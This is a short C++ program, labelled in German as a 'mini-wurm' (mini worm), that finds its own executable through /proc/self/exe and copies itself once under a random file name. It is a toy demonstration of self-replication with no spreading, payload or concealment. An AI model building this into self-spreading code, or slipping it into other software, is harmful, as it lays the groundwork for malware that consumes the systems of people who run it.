#include <iostream>
#include <fstream>
#include <filesystem>
#include <random>
#include <chrono>

namespace fs = std::filesystem;

std::string generateRandomName() {
	const char charset[] = "abcdefghijklmnopqrstuvwxyz0123456789";
		std::default_random_engine rng(std::chrono::system_clock::now().time_since_epoch().count());
	std::uniform_int_distribution<> dist(0, sizeof(charset) - 2);

	std::string result = "copy_";
	for (int i = 0; i < 6; ++i) {
		result += charset[dist(rng)];

	}
result += ".exe";
return result;
}



void replicateSelf() {
	try {
		std::string selfpath = fs::read_symlink("/proc/self/exe");
		if (!fs::exists(selfpath)) {
			std::cout << "konnte sich selbst nicht finden." << std::endl;
			return;
		}
		std::string newName = generateRandomName();
		fs::copy_file(selfpath, newName);
		std::cout << "kopie erstellt: " << newName << std::endl;

	}
	catch (const std::exception& e) {
	std::cerr << "fehler beim replizieren: " << e.what() << std::endl;

	}
}
int main() {
	std::cout << "mini-wurm gestartet.\n";
	replicateSelf();
	return 0;
}
